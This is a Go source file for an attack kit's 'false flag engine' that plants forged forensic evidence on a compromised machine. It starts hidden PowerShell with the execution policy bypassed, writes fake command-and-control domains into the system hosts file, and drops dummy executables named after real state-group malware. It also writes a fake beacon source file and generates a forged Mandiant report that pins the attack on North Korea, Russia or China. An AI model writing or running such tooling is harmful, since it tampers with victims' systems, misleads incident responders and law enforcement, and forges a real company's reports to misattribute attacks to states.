package blockz

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type FalseFlagEngine struct {
	Config         *BlockZConfig
	ImpersonateAPT string            `json:"impersonate_apt"`
	ArtefactsPlanted int             `json:"artefacts_planted"`
	Forgeries       []ForensicForgery `json:"forgeries"`
}

type ForensicForgery struct {
	Type       string `json:"type"`
	Detail     string `json:"detail"`
	PlantedAt  string `json:"planted_at"`
	Convincing float64 `json:"convincing_score"`
	APTProfile string `json:"apt_profile"`
}

type APTProfile struct {
	Name        string   `json:"name"`
	Country     string   `json:"country"`
	Tools       []string `json:"tools"`
	MutexNames  []string `json:"mutex_names"`
	C2Domains   []string `json:"c2_domains"`
	CodeComment string   `json:"code_comment"`
	TLALevel    string   `json:"tla_level"`
}

var aptDatabase = map[string]APTProfile{
	"Lazarus": {
		Name: "Lazarus Group", Country: "DPRK",
		Tools:      []string{"Fallchill", "Brambul", "HARDRAIN", "Andarat"},
		MutexNames: []string{"Global\\WindowsUpdateMutex", "DPRK_MUTEX_2024", "LazarusWSUS"},
		C2Domains:  []string{"update.microsoft.com.kp", "windows-update.net", "msdownload.pw"},
		CodeComment: "// Ryuk ransomware upgrade by Lazarus",
		TLALevel:   "RECONNAISSANCE_GENERAL_BUREAU",
	},
	"APT29": {
		Name: "Cozy Bear", Country: "Russia",
		Tools:      []string{"Sunburst", "Teardrop", "Raindrop", "Cobalt Strike"},
		MutexNames: []string{"Global\\SvcHostMutex", "CozyDuke2023", "APT29Beacon"},
		C2Domains:  []string{"windowsupdate.su", "msftncsi.com.ru", "nsatask.net"},
		CodeComment: "// SVR classified operation - do not distribute",
		TLALevel:   "SVR",
	},
	"APT41": {
		Name: "Winnti Group", Country: "China",
		Tools:      []string{"Crosswalk", "Derusbi", "PlugX", "ShadowPad"},
		MutexNames: []string{"Global\\UpdatesSvc", "MSSecurityUpdate", "CN_CERT_MUTEX"},
		C2Domains:  []string{"cdn.microsoft-update.cn", "symantec-security.net", "technet.pw"},
		CodeComment: "// Ministry of State Security - Project DoubleDragon",
		TLALevel:   "MSS",
	},
}

func NewFalseFlagEngine(cfg *BlockZConfig) *FalseFlagEngine {
	return &FalseFlagEngine{
		Config:         cfg,
		ImpersonateAPT: cfg.APTImpersonate,
	}
}

func (ff *FalseFlagEngine) PlantFalseFlags() int {
	planted := 0

	for aptName, profile := range aptDatabase {
		if ff.ImpersonateAPT != "" && aptName != ff.ImpersonateAPT {
			continue
		}

		ff.plantMutexes(profile)
		ff.plantC2Domains(profile)
		ff.plantTools(profile)
		ff.plantCodeComments(profile)
		ff.plantMetadata(profile)

		forgery := ForensicForgery{
			Type: "full_apt_profile", Detail: fmt.Sprintf("Impersonating %s (%s)", profile.Name, profile.Country),
			PlantedAt: time.Now().Format(time.RFC3339), Convincing: 0.92,
			APTProfile: aptName,
		}
		ff.Forgeries = append(ff.Forgeries, forgery)
		planted += 4
	}

	ff.ArtefactsPlanted = planted
	return planted
}

func (ff *FalseFlagEngine) plantMutexes(profile APTProfile) {
	for _, mutex := range profile.MutexNames {
		switch runtime.GOOS {
		case "windows":
			psScript := fmt.Sprintf(`$mutex = New-Object System.Threading.Mutex($false, "%s")
$mutex.WaitOne() | Out-Null
Start-Sleep -Seconds 3600`, mutex)
			psPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_mutex_%x.ps1", len(mutex)))
			os.WriteFile(psPath, []byte(psScript), 0644)
			exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
		case "linux":
			mutexPath := filepath.Join("/tmp", fmt.Sprintf(".x404x_%s.lock", strings.ReplaceAll(mutex, "\\", "_")))
			os.WriteFile(mutexPath, []byte(fmt.Sprintf("PID=%d", os.Getpid())), 0644)
		}
	}
}

func (ff *FalseFlagEngine) plantC2Domains(profile APTProfile) {
	for _, domain := range profile.C2Domains {
		hostsPath := `C:\Windows\System32\drivers\etc\hosts`
		if runtime.GOOS != "windows" {
			hostsPath = "/etc/hosts"
		}
		entry := fmt.Sprintf("\n10.0.0.1 %s # X404X planted", domain)
		f, err := os.OpenFile(hostsPath, os.O_APPEND|os.O_WRONLY, 0644)
		if err == nil {
			f.WriteString(entry)
			f.Close()
		}
	}
}

func (ff *FalseFlagEngine) plantTools(profile APTProfile) {
	toolsDir := filepath.Join(os.TempDir(), "x404x_apt_tools")
	os.MkdirAll(toolsDir, 0755)

	for _, tool := range profile.Tools {
		toolPath := filepath.Join(toolsDir, fmt.Sprintf("%s.exe", tool))
		payload := make([]byte, 1024)
		rand.Read(payload)
		payload[0] = 0x4D
		payload[1] = 0x5A
		os.WriteFile(toolPath, payload, 0644)
	}
}

func (ff *FalseFlagEngine) plantCodeComments(profile APTProfile) {
	commentsPath := filepath.Join(os.TempDir(), "x404x_source_artefact.c")
	code := fmt.Sprintf(`/**
 * %s
 * Classified Operation: %s
 * Date: %s
 */
%s

int main() {
    // Initialize beacon
    void* beacon = init_beacon("%s");
    beacon_start(beacon);
    return 0;
}
`, profile.CodeComment, profile.TLALevel, time.Now().AddDate(-3, 0, 0).Format("2006-01-02"),
		profile.CodeComment, strings.Join(profile.C2Domains, ","))
	os.WriteFile(commentsPath, []byte(code), 0644)
}

func (ff *FalseFlagEngine) plantMetadata(profile APTProfile) {
	metadataDir := filepath.Join(os.TempDir(), "x404x_apt_metadata")
	os.MkdirAll(metadataDir, 0755)

	metadata := fmt.Sprintf(`APT Group: %s
Country: %s
TLA Level: %s
Tools: %s
First Seen: %s
Last Active: %s
Confidence: HIGH
`, profile.Name, profile.Country, profile.TLALevel,
		strings.Join(profile.Tools, ", "),
		time.Now().AddDate(-6, 0, 0).Format("2006-01-02"),
		time.Now().Format("2006-01-02"))

	metadataPath := filepath.Join(metadataDir, "operation_details.txt")
	os.WriteFile(metadataPath, []byte(metadata), 0644)
}

func (ff *FalseFlagEngine) GenerateMandiantReport() string {
	profile := aptDatabase[ff.ImpersonateAPT]
	if profile.Name == "" {
		profile = aptDatabase["Lazarus"]
	}

	report := fmt.Sprintf(`MANDIANT THREAT INTELLIGENCE REPORT
======================================

CLASSIFICATION: TOP SECRET / NOFORN

Executive Summary
------------------
Mandiant has identified a sophisticated cyber attack attributed with HIGH confidence 
to %s (%s), a state-sponsored threat group operating under %s.

Attack Timeline
---------------
Initial Access: %s
Lateral Movement: %s
Data Exfiltration: %s
Ransomware Deployment: %s

Indicators of Compromise (IoCs)
-------------------------------
Mutexes: %s
C2 Domains: %s
Tools Identified: %s
Code Attribution: %s

MITRE ATT&CK Techniques
-----------------------
T1566 - Spear Phishing
T1059 - Command and Scripting Interpreter
T1027 - Obfuscated Files or Information
T1486 - Data Encrypted for Impact
T1071 - Application Layer Protocol

Conclusion
----------
This attack bears all hallmarks of %s operations.
The technical indicators, tradecraft, and targeting align with
known TTPs of this group. We assess with 95%% confidence that
%s is responsible.

Mandiant Threat Intelligence
`, profile.Name, profile.Country, profile.TLALevel,
		time.Now().AddDate(0, -2, 0).Format("2006-01-02"),
		time.Now().AddDate(0, -1, 0).Format("2006-01-02"),
		time.Now().AddDate(0, 0, -14).Format("2006-01-02"),
		time.Now().Format("2006-01-02"),
		strings.Join(profile.MutexNames, ", "),
		strings.Join(profile.C2Domains, ", "),
		strings.Join(profile.Tools, ", "),
		profile.CodeComment,
		profile.Name, profile.Name)

	reportPath := filepath.Join(os.TempDir(), "mandiant_x404x_report.txt")
	os.WriteFile(reportPath, []byte(report), 0644)
	return report
}

func (ff *FalseFlagEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"impersonating":"%s","artefacts_planted":%d,"forgeries":%d,"profiles_available":%d}`,
		ff.ImpersonateAPT, ff.ArtefactsPlanted, len(ff.Forgeries), len(aptDatabase))
}
